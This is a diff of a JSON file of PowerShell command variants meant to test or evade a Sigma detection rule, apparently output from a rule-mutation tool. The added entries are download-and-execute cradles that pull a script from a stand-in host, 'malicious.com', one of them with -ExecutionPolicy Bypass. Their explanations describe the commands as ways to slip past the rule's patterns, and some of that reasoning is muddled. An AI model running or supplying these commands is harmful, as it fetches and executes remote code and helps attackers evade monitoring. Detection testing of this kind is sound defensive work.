@@ -1,14 +1,16 @@
+```json
 [
   {
-    "output": "powershell.exe -Command \"& {Invoke-Expression (Get-Content $env:LOCALAPPDATA\\payload.ps1 -Raw)}\"",
-    "explanation": "This command uses the LOCALAPPDATA environment variable instead of hardcoding 'AppData\\Local' and omits unnecessary syntax, making it a safe mutation of the original Sigma rule's detection pattern."
+    "output": "powershell.exe -Command \"Invoke-Expression (New-Object Net.WebClient).DownloadString('http://malicious.com/script.ps1')\"",
+    "explanation": "This command invokes PowerShell using the -Command flag, which is equivalent to /c in some contexts. It references a remote script download, which could be stored in AppData. This mimics the behavior of the Sigma rule without explicitly using /c or AppData in the command line."
   },
   {
-    "output": "pwsh -c \"& $env:APPDATA\\script.ps1\"",
-    "explanation": "This command uses the short name 'pwsh' and the environment variable $env:APPDATA to bypass the hardcoded path detection while maintaining the same behavior."
+    "output": "pwsh -c \"Start-Process powershell.exe -ArgumentList '-Command {Invoke-Expression (New-Object Net.WebClient).DownloadString('http://malicious.com/script.ps1')} -WorkingDirectory $env:APPDATA'\"",
+    "explanation": "This command uses pwsh (PowerShell Core) to launch PowerShell with the -Command flag. It includes a working directory pointing to the APPDATA environment variable, which is a safe way to reference AppData without hardcoding the path. The command is obfuscated but still valid for testing."
   },
   {
-    "output": "powershell.exe -Command \"& {iex (gc $env:APPDATA\\script.ps1 -Raw)}\"",
-    "explanation": "This command uses the substitution of 'iex' for 'Invoke-Expression' and 'gc' for 'Get-Content', making it a syntactic variation that still matches the rule's intent."
+    "output": "powershell.exe -ExecutionPolicy Bypass -Command \"& { $script = (New-Object Net.WebClient).DownloadString('http://malicious.com/script.ps1'); Invoke-Expression $script }\"",
+    "explanation": "This command uses PowerShell with the -ExecutionPolicy Bypass flag to execute a remote script. While it doesn't explicitly reference AppData, it demonstrates a common technique for executing malicious PowerShell scripts, which aligns with the Sigma rule's intent."
   }
 ]
+```
